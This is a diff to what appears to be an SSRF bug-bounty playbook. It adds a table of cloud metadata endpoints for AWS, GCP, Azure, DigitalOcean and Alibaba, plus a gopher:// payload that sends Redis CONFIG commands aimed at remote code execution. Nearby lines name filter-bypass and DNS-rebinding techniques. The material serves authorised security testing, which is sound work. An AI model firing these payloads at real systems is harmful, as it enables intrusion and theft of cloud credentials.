@@ -457,3 +457,18 @@ The following real, verified bug-bounty / coordinated-disclosure cases extend th
 - **`hunt-cloud-misconfig`** — Internal-only buckets/APIs become reachable through SSRF egress. Chain primitive: SSRF + DNS rebinding → SSRF-protected-endpoint bypass → internal /admin or private S3 bucket read.
 - **`security-arsenal`** — Load the SSRF IP Bypass Table (11 techniques: decimal IP, IPv6 mapped, octal, suffix dot, DNS rebinding, redirect chain, etc.) before testing filters.
 - **`triage-validation`** — Apply the OOB-Or-It-Didn't-Happen gate: every blind SSRF claim requires a Burp Collaborator hit with a unique marker before report submission.
+
+### Phase X — Cloud Metadata Catalog
+
+| Provider | Metadata Endpoint |
+|---|---|
+| AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/` |
+| GCP | `http://metadata.google.internal/computeMetadata/v1/` |
+| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` |
+| DigitalOcean | `http://169.254.169.254/metadata/v1.json` |
+| Alibaba Cloud | `http://100.100.100.200/latest/meta-data/` |
+
+Gopher protocol to Redis/FastCGI RCE:
+```
+gopher://127.0.0.1:6379/_SET%20crack%20test%0d%0aCONFIG%20SET%20dir%20/var/www/html
+```
